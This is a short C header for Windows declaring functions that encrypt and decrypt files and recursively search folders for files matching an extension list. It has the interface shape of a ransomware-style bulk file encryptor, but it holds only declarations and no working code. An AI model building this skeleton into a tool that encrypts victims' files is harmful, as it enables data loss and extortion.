#pragma once
#include <windows.h>
#include <wincrypt.h>
#include <stdbool.h>
#include "StringManips.h"

//Filename Extensions List Format: ".xxx.yyy.zzz"

void EncryptBytes(WCHAR filePath[], HKEY hKey);
void DecryptBytes(WCHAR filePath[], HKEY hKey);
WCHAR* RecursiveDirSearch(WCHAR folder[], WCHAR listOfFileExtensions[], HKEY hKey, bool decrypt);